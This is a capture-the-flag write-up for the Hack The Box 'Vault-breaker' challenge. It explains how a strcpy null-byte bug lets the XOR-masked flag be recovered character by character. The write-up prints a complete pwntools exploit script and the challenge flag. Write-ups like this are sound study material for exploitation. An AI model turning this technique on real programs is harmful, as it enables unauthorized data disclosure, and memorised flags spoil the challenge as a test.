# Vault-breaker
> Write-up author: jon-brandy
## DESCRIPTION:
Money maker, Big Boy Bonnie has a crew of his own to do his dirty jobs. In a tiny little planet a few lightyears away, a custom-made vault has been found by his crew. 
Something is hidden inside it, can you find out the way it works and bring it to Bonnie?
## HINT:
- NONE
## STEPS:
1. In this challenge we're given a 64 bit binary, dynamically linked, and not stripped.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fee75c8f-8712-4253-86f6-e9d4223e992a)

> BINARY PROTECTIONS 

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/aa77f0fa-38d7-4e28-a6db-91959cbb4fba)


2. After decompiled the binary and analyzed the `secure_password()` function which is the second menu option.
3. I found no vuln and it just perform safe XOR operation for the flag strings.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7d86234e-a150-4c78-9edc-335c90fea824)


4. But the bug is at the 1st menu option which is the `new_key_gen()` function.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d0e69019-3714-4578-ab4f-556a74383fd2)

5. It checks whether the user input has null byte, then it shall printed out the original char.
6. Well the vuln is at the strcpy(), if we're using strcpy() it does copy the nullbyte (at the end of the strings). For secure coding practice better using memcpy().
7. Anyway the exploit here, is we can leak the flag char one by one by set a position manually for the nullbyte.
8. As we know the program accepts 31 bytes and there's a memset which set 32 bytes of 0 at first.
9. So rather we leak it from the left, we can leak it more easily from the right using for loop.

> SCRIPT TEMP

```py
for i in range(0x1F, -1, -1):
    print('[INFO] Iter: ', i)
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b':', str(i))
```

10. After we leak all the character then we open the second menu to get the flag.

> FULL SCRIPT

```py
from pwn import *
import os 

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './vault-breaker'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

sh = start()

# exploit starts
# 0x1F == 31
for i in range(31, -1, -1):
    print('[INFO] Iter: ', i)
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b':', str(i))

sh.sendlineafter(b'>', b'2')

sh.interactive()
```

> TEST LOCALLY

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4df902d1-7c75-4581-a0d1-14b5872ec7c6)


11. Great we got it locally, but notice we failed to leak the `}`. Kinda confused why because our local flag length is 24.
12. Anyway let's send it remotely.

> REMOTELY

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/76bf0af6-9662-4f2d-89b2-4103ac9e8251)


#### NOTES: 
```
The binary at the remote server is very unstable, took me a while to get the flag remotely,i keep terminate and spawn the host again and again.
Because if you tried to leak it manually without the script, you'll notice few char can't be leaked and when you restart the host, it can be leaked.
```

## FLAG
```
HTB{d4nz4_kudur0r0r0}
```


